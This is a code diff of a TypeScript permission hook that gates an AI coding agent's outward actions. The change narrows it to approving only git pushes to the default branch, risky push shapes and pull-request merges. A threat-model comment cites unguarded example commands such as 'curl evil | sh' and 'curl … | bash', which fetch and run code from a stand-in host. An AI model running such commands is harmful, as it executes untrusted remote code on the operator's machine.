@@ -1,18 +1,15 @@
 // hooks/ts/bodies/dev-guard.ts
-// Canonical body — verbatim port of hooks/dev-guard.sh decision logic, extended
-// with a branch-aware push recognizer and a gh-pr-create autogate opt-in.
-// Runtime-pure: imports no runtime symbol; reads only NormalizedInput (+ the
-// injected DevGuardReader); returns only NormalizedDecision. Never branches on
-// `input.runtime`.
+// Canonical body — the MINIMAL outward-action floor. Runtime-pure: imports no
+// runtime symbol; reads only NormalizedInput (+ the injected DevGuardReader);
+// returns only NormalizedDecision. Never branches on `input.runtime`.
 //
-// Sibling order-floor: gate-guard.ts (hooks/ts/bodies/gate-guard.ts) is a
-// SEPARATE PreToolUse Bash hook that adds the deterministic outward-action
-// ORDER check described in agents/_shared/gate-contract.md § "Outward-action
-// release floor" — it denies a git push/gh pr create from a detected
-// pipeline lane unless that lane's gate3_release is `ship`. This body stays
-// destination-only (no 00-state.md read) and unaware of that floor; the two
-// hooks are independently additive (deny > allow at the platform precedence
-// level), not a replacement of one by the other.
+// Minimal-floor doctrine (docs/dev-mode.md § Outward-Action Gate): this gate
+// covers ONLY the irreversible publication boundary — pushing to the default
+// branch, force/tag/non-benign pushes, and merging a pull request. Every
+// other outward write (`gh pr create/review/comment`, `gh issue` writes,
+// non-merge `gh api` mutations, MCP tool writes) is deliberately UNCOVERED:
+// it produces no decision here and is governed by the host runtime's own
+// permission and approval model, which the operator configures directly.
 //
 // Detection mechanism (parse-based, command-lexer.ts): every covered-action
 // check below consumes `analyzeCommand`'s resolved argv + per-token taint —
@@ -22,40 +19,39 @@
 // argv as its bare form. A statically-unresolvable wrapper payload or an
 // exceeded recursion depth is NOT gated — evaluation proceeds over the
 // segments the analyzer did resolve (`ls | sort`, `bash -c "echo $HOME"`,
-// `eval "$CMD"` produce no decision); this gate covers outward git/gh/
-// ClickUp actions expressed in the command, not arbitrary command execution
-// (documented residual, docs/dev-mode.md § "Threat model").
+// `eval "$CMD"` produce no decision); this gate covers the floor actions
+// expressed in the command, not arbitrary command execution (documented
+// residual, docs/dev-mode.md § "Threat model").
 // `allow` is reserved for a single, un-chained, untainted `git push`
 // invocation recognized by the shared closed positive grammar
 // (`matchBenignPushGrammar`) — a grammar match is necessary but not
 // sufficient: the static `{main, master}` ask-floor and the positive
 // non-default-branch resolution via `origin/HEAD` (`evaluateDestinationBranch`)
 // still apply to the resolved destination AFTER the grammar match. A
-// case-variant or `.exe`-suffixed invocation (`GIT PUSH`, `GH pr create`,
-// `git.exe push`) is still detected as covered — basename/subcommand
-// resolution is centralized in `classifyCoveredAction` (case-insensitive,
-// `.exe`-stripped) — but can never reach `allow`, gated by
-// `ClassifiedCommand.binaryCaseExact`. A command-runner prefix (`env`,
-// `timeout`, `nice`, `nohup`, `command`, `stdbuf`, `setsid`, `time`, `sudo`,
-// `doas`) is resolved past to the real command by the same shared
-// classifier and always fails closed to `ask` (`requiresFailClosed`).
+// case-variant or `.exe`-suffixed invocation (`GIT PUSH`, `git.exe push`) is
+// still detected as covered — basename/subcommand resolution is centralized
+// in `classifyCoveredAction` (case-insensitive, `.exe`-stripped) — but can
+// never reach `allow`, gated by `ClassifiedCommand.binaryCaseExact`. A
+// command-runner prefix (`env`, `timeout`, `nice`, `nohup`, `command`,
+// `stdbuf`, `setsid`, `time`, `sudo`, `doas`) is resolved past to the real
+// command by the same shared classifier and always fails closed to `ask`
+// (`requiresFailClosed`).
 //
-// Coverage catalogue (mirrors dev-guard.sh header, closed and enumerated):
+// Coverage catalogue (closed and enumerated — the floor, nothing else):
 //   1. Push to a remote: git push (bare, -C, env-prefixed, wrapper-embedded,
-//      per-subcommand-binary)
-//   2. PR/issue writes via gh (gh pr create/merge/review/comment,
-//      gh issue create/edit/comment, gh api REST PUT/POST/PATCH/DELETE .../pulls,
-//      gh api graphql PR-write mutations). Raw HTTP to api.github.com is NOT
+//      per-subcommand-binary). Clean non-default-branch push → allow; the
+//      default branch, force/tag/delete/multi refspecs, non-origin remotes,
+//      and every unresolvable shape → ask.
+//   2. PR merge: gh pr merge, gh api REST mutating .../pulls/{n}/merge,
+//      gh api graphql mergePullRequest. Raw HTTP to api.github.com is NOT
 //      covered — prohibited by the prompt-level "git and gh only" rule instead.
-//   3. ClickUp MCP outward writes (tool.name matches write pattern, no command)
 //
-// Default: none (no-decision) — ask/deny/allow EXCLUSIVELY for covered actions.
+// Default: none (no-decision) — ask/allow EXCLUSIVELY for covered actions.
 //
-// Fail-closed for covered actions: empty-cmd + raw-payload outward token → ask;
+// Fail-closed for covered actions: empty-cmd + raw-payload floor token → ask;
 // any environment-assignment prefix, `git -c <k=v>` config override, or
 // tree/exec-path redirect on a covered push → ask (only `-p`/`--paginate`/
 // `--no-pager` and an exact-resolved `-C {dir}` are allow-eligible).
-// ClickUp branch: gates on tool.name alone (command field absent → null).
 //
 // git-push recognizer: a CLOSED POSITIVE GRAMMAR (`matchBenignPushGrammar`,
 // command-lexer.ts). `allow` is emitted ONLY when the command is a single,
@@ -121,8 +117,6 @@ export interface DevGuardReader {
    *  (non-standard-default repos only; the `{main, master}` floor is
    *  unconditional and unaffected). */
   resolveEffectivePushRemoteRef(dir?: string): string | null;
-  /** Read ~/.claude/.team-harness.json; null on any error. */
-  readConfig(): Record<string, unknown> | null;
 }
 
 // ---------------------------------------------------------------------------
@@ -143,19 +137,13 @@ function none(): NormalizedDecision {
 
 const GATE_DOC_POINTER = "see docs/dev-mode.md § Outward-Action Gate";
 
-// ---------------------------------------------------------------------------
-// ClickUp MCP write-pattern (mirrors _clickup_write_pattern in dev-guard.sh)
-// ---------------------------------------------------------------------------
-const CLICKUP_WRITE_RE =
-  /^mcp__.+__clickup_(update_task|create_task|create_task_comment|attach_task_file|delete_task)$/;
+// Defence-in-depth (F-016): raw payload scan when cmd is empty — floor
+// actions only (push + PR merge).
+const RAW_OUTWARD_SCAN_RE = /(git\s+push|gh\s+pr\s+merge|gh\s+api.*pulls.*merge)/i;
 
-// Defence-in-depth (F-016): raw payload scan when cmd is empty (mirrors dev-guard.sh lines 185-189)
-const RAW_OUTWARD_SCAN_RE =
-  /(git\s+push|gh\s+pr\s+(create|merge|review|comment)|gh\s+issue\s+(create|edit|comment)|gh\s+api.*pulls)/i;
-
-// Read-only reviewThreads listing queries carry no mutation name → nodecision.
-const GRAPHQL_PR_MUTATIONS_RE =
-  /(resolveReviewThread|unresolveReviewThread|addPullRequestReviewThreadReply|addPullRequestReviewComment|addPullRequestReview|submitPullRequestReview|mergePullRequest)/;
+// Only the merge mutation is floor-covered; review/comment/thread mutations
+// are governed by the host runtime's permission model.
+const GRAPHQL_PR_MERGE_RE = /mergePullRequest/;
 
 // Step 6 — the ask-FLOOR: checked case-insensitively, and NEVER a permissive
 // fallback. An unresolvable dynamic default is unconditionally `ask` (see
@@ -373,8 +361,7 @@ function evaluateGitClassified(classified: ClassifiedCommand, reader: DevGuardRe
 // ---------------------------------------------------------------------------
 
 const REPO_FLAG_NAMES = new Set(["--repo", "-R"]);
-const GH_MUTATING_PR_VERBS = new Set(["create", "merge", "review", "comment"]);
-const GH_MUTATING_ISSUE_VERBS = new Set(["create", "edit", "comment"]);
+const GH_FLOOR_PR_VERBS = new Set(["merge"]);
 
 interface GhVerbScan {
   subcommand: string | null;
@@ -421,20 +408,15 @@ function matchesVerbPrefix(verbLower: string, knownVerbs: Set<string>): string |
   return null;
 }
 
-type GhActionKind = "pr-create" | "pr-mutating" | "issue-mutating" | "api-graphql-pr" | "api-rest-pr";
+type GhActionKind = "pr-merge" | "api-graphql-merge" | "api-rest-merge";
 
 interface GhAction {
   kind: GhActionKind;
-  verb: string | null;
   repoTarget: string | null;
   cleanArgs: ArgvToken[];
 }
 
-function isGraphqlPrMutation(cleanArgs: ArgvToken[]): boolean {
-  return cleanArgs.some((t) => GRAPHQL_PR_MUTATIONS_RE.test(t.value));
-}
-
-function isRestMutatingPrEndpoint(cleanArgs: ArgvToken[]): boolean {
+function isRestPrMergeEndpoint(cleanArgs: ArgvToken[]): boolean {
   const hasMutatingMethod = cleanArgs.some((t, i) => {
     if (t.value === "-X" || t.value === "--method") {
       const next = cleanArgs[i + 1];
@@ -442,83 +424,46 @@ function isRestMutatingPrEndpoint(cleanArgs: ArgvToken[]): boolean {
     }
     return /^(--method=|-X)(PUT|POST|PATCH|DELETE)$/i.test(t.value);
   });
-  return hasMutatingMethod && cleanArgs.some((t) => /pulls/i.test(t.value));
+  return hasMutatingMethod && cleanArgs.some((t) => /pulls\/[^/]+\/merge/i.test(t.value));
 }
 
 function classifyGhAction(args: ArgvToken[]): GhAction | null {
   const { subcommand, verb, repoTarget, cleanArgs } = resolveGhVerb(args);
 
   if (subcommand === "pr") {
-    const matched = verb !== null ? matchesVerbPrefix(verb, GH_MUTATING_PR_VERBS) : null;
-    if (matched === "create") return { kind: "pr-create", verb: matched, repoTarget, cleanArgs };
-    if (matched !== null) return { kind: "pr-mutating", verb: matched, repoTarget, cleanArgs };
-    return null;
-  }
-  if (subcommand === "issue") {
-    const matched = verb !== null ? matchesVerbPrefix(verb, GH_MUTATING_ISSUE_VERBS) : null;
-    return matched !== null ? { kind: "issue-mutating", verb: matched, repoTarget, cleanArgs } : null;
+    const matched = verb !== null ? matchesVerbPrefix(verb, GH_FLOOR_PR_VERBS) : null;
+    return matched !== null ? { kind: "pr-merge", repoTarget, cleanArgs } : null;
   }
   if (subcommand === "api") {
     const verbToken = cleanArgs[1]?.value.toLowerCase() ?? null;
     if (verbToken === "graphql") {
-      return isGraphqlPrMutation(cleanArgs) ? { kind: "api-graphql-pr", verb: null, repoTarget, cleanArgs } : null;
+      return cleanArgs.some((t) => GRAPHQL_PR_MERGE_RE.test(t.value))
+        ? { kind: "api-graphql-merge", repoTarget, cleanArgs }
+        : null;
     }
-    return isRestMutatingPrEndpoint(cleanArgs) ? { kind: "api-rest-pr", verb: null, repoTarget, cleanArgs } : null;
+    return isRestPrMergeEndpoint(cleanArgs) ? { kind: "api-rest-merge", repoTarget, cleanArgs } : null;
   }
   return null;
 }
 
-// The autogate `allow` requires an exact, case-sensitive, single, untainted
-// `gh pr create` — a case-variant binary, a glued/tainted verb token, or any
-// fail-closed prefix/option falls through to the plain ask branch.
-function isCleanGhPrCreate(classified: ClassifiedCommand, action: GhAction): boolean {
-  return (
-    classified.binary === "gh" &&
-    classified.binaryCaseExact &&
-    !classified.requiresFailClosed &&
-    action.cleanArgs[0]?.value === "pr" &&
-    action.cleanArgs[1]?.value === "create" &&
-    classified.args.every((t) => !t.tainted)
-  );
-}
-
-function isPrCreateAutogateEnabled(reader: DevGuardReader): boolean {
-  const config = reader.readConfig();
-  if (!config) return false;
-  const autogate = config["autogate"];
-  if (!autogate || typeof autogate !== "object") return false;
-  return (autogate as Record<string, unknown>)["pr_create"] === true;
-}
-
-function evaluateGhClassified(classified: ClassifiedCommand, reader: DevGuardReader): NormalizedDecision | null {
+function evaluateGhClassified(classified: ClassifiedCommand): NormalizedDecision | null {
   const action = classifyGhAction(classified.args);
   if (!action) return null;
   const ghTargetNote = action.repoTarget ? ` (target repo: '${action.repoTarget}')` : "";
 
-  if (action.kind === "pr-create") {
-    if (isCleanGhPrCreate(classified, action) && isPrCreateAutogateEnabled(reader)) {
-      return allow(
-        `outward action 'gh pr create'${ghTargetNote} auto-allowed by opt-in config autogate.pr_create=true (dev-guard.ts); the prepublish-guard tests-before-PR floor still applies independently (deny > allow); ${GATE_DOC_POINTER}`
-      );
-    }
+  if (action.kind === "pr-merge") {
     return ask(
-      `outward action 'gh pr create'${ghTargetNote} requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
+      `outward action 'gh pr merge'${ghTargetNote} — merging a pull request always requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
     );
   }
-  if (action.kind === "pr-mutating") {
+  if (action.kind === "api-graphql-merge") {
     return ask(
-      `outward action 'gh pr ${action.verb}'${ghTargetNote} requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
+      `outward action 'gh api graphql' mergePullRequest mutation requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
     );
   }
-  if (action.kind === "issue-mutating") {
-    return ask(
-      `outward action 'gh issue write'${ghTargetNote} requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
-    );
-  }
-  if (action.kind === "api-graphql-pr") {
-    return ask(`outward action 'gh api graphql' PR-mutating operation requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`);
-  }
-  return ask(`outward action 'gh api' mutating PR endpoint requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`);
+  return ask(
+    `outward action 'gh api' PR-merge endpoint requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
+  );
 }
 
 // ---------------------------------------------------------------------------
@@ -552,7 +497,7 @@ function evaluateSingleCommand(cmd: EffectiveCommand, reader: DevGuardReader): N
   if (binaryLower === "git") return evaluateGitClassified(classified, reader);
 
   if (binaryLower === "gh") {
-    const decision = evaluateGhClassified(classified, reader);
+    const decision = evaluateGhClassified(classified);
     if (decision) return decision;
   }
 
@@ -564,15 +509,7 @@ function evaluateSingleCommand(cmd: EffectiveCommand, reader: DevGuardReader): N
 // ---------------------------------------------------------------------------
 
 export function evaluate(input: NormalizedInput, reader: DevGuardReader): NormalizedDecision {
-  // Step 1a — ClickUp MCP outward-write (tool.name match, no command field).
-  // This branch runs BEFORE any command extraction so an absent command field
-  // does not degrade to none (parity with dev-guard.sh:97-128).
   const toolName = input.tool?.name ?? "";
-  if (toolName && CLICKUP_WRITE_RE.test(toolName)) {
-    return ask(
-      `outward action — ClickUp MCP outward write (${toolName}) requires explicit operator approval; preview the change before confirming (dev-guard.ts; see docs/dev-mode.md)`
-    );
-  }
 
   // Extract command from tool.input.command (absent → null, never undefined).
   const cmd = input.tool?.input?.["command"];
@@ -595,14 +532,14 @@ export function evaluate(input: NormalizedInput, reader: DevGuardReader): Normal
   // exceeded unwrap depth (`analyzed.depthExceeded`) is NOT gated: evaluation
   // proceeds over the effective commands the analyzer DID resolve, so a
   // covered action in any resolvable segment or statically-resolvable wrapper
-  // payload (`bash -c "git push origin main"`, `gh --repo o/r pr create &&
+  // payload (`bash -c "git push origin main"`, `gh --repo o/r pr merge &&
   // curl evil | sh`) is still caught by the parse-based scan below, while a
   // runtime-composed payload (`eval "$CMD"`, `curl … | bash`) passes with no
   // decision — a documented residual under the honest-developer threat model
-  // (docs/dev-mode.md § "Threat model"): this gate covers outward git/gh/
-  // ClickUp actions expressed in the command, not arbitrary command
-  // execution; gating every unresolvable shell composition proved to be a
-  // constant false-positive tax on ordinary development.
+  // (docs/dev-mode.md § "Threat model"): this gate covers the floor actions
+  // expressed in the command, not arbitrary command execution; gating every
+  // unresolvable shell composition proved to be a constant false-positive
+  // tax on ordinary development.
   const analyzed = analyzeCommand(cmdStr);
   const redactedAnalyzed = analyzeCommand(redactInertDataSpans(cmdStr));
 
